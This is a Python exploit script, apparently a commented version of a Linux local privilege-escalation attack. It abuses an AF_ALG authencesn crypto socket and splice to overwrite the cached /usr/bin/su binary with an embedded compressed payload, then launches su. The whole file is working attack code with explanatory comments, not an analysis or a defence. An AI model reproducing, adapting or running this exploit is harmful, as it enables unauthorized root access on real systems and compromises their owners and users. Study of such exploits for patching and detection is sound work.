#!/bin/python3
import os
import zlib
import socket

#B64-encoded byte payload
PAYLOAD = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

''' Function d() --> toBytes() '''
def toBytes(_hex):
    return bytes.fromhex(_hex)

'''
Function c() --> copyFail()

Variable Translations

Parameters (f,t,c) --> (file,index,byteData)

a = ALFSocket
h = sockLevel
v = sockOptObj
u = client
_ = addr
o = offset
i = zeros
r,w = read, write
n = fdSplice
'''
def copyFail(file, index, byteData):
    #socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
    ALFSocket = socket.socket(38, 5, 0)
    #bind to authencesn AEAD template
    ALFSocket.bind(("aead",
                    "authencesn(hmac(sha256),cbc(aes))"))

    sockLevel = 279 #exploit uses socket level 279
    sockOptObj = ALFSocket.setsockopt
    #level=279, optname=1 (ALG_SET_KEY), optval=bytes (key for authencesn)
    sockOptObj(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
    #level=279, optname=5 (ALG_SET_AEAD_AUTHSIZE), set to 4 byte tag
    sockOptObj(sockLevel, 5, None, 4)
    
    client, addr = ALFSocket.accept()
    
    offset = index+4 #increment by 4 bytes of payload
    zeros = toBytes('00')

    #send payload buffer, last AUTHSIZE (4) bytes are written (as seqno_lo)
    #the ciphertext is fabricated to fail
    #([msg], ALG_SET_OP (3), ALG_SET_IV (2), ALG_SET_ASSOCLEAN (4)
    client.sendmsg([b"A"*4+byteData],
                    [(sockLevel, 3, zeros*4), #SET_OP to decrypt
                    (sockLevel,2,b'\x10'+zeros*19), #SET_IV
                    (sockLevel, 4, b'\x08'+zeros*3), #SET_ASSOCLEN (AAD)
                    ], 32768)
    
    read, write = os.pipe()
    fdSplice = os.splice #splice passes by reference
    #splice /usr/bin/su to write
    fdSplice(file, write, offset, offset_src=0) 
    #splice AF_ALG socket to read:
    #the payload is written (4 bytes at a time) into the cached copy of su
    fdSplice(read, client.fileno(), offset)

    try:
        client.recv(8+index)
    except:
        return 0


''' Main function to execute payload '''
if __name__ == '__main__':
    file = os.open("/usr/bin/su", 0) #open readonly target su
    i = 0
    decomp = zlib.decompress(toBytes(PAYLOAD)) #decode and decompress payload

    while i<len(decomp):
        copyFail(file, i, decomp[i:i+4]) #iterate through payload bytes
        i += 4

    os.system("su") #call modified target file
